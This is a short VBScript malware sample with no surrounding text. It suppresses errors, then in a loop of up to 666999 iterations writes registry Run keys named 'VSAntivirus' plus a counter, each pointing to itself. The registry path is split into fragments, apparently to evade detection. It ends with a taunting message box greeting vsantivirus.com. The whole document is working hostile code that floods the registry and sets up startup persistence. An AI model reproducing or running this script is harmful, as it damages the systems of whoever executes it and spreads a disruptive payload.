   on error resume next
   Dim vsantivirus
   vsantivirus_v = 1
   Set vsantivirus = WScript.CreateObject("WScript.Shell")
   vsantivirus_s = WScript.ScriptFullName;
   for vsantivirus_c = 1 to 666999
     vsantivirus.RegWrite "HKLM\So" & "ftware\M" & "icros" & "oft\Win" & "dows\Cur" & "rentVer" & "sion\Run\VSAntivirus" & vsantivirus_v, vsantivirus_s
     vsantivirus_v = vsantivirus_v + 1
   next
   msgbox "Saludos a vsantivirus.com!"
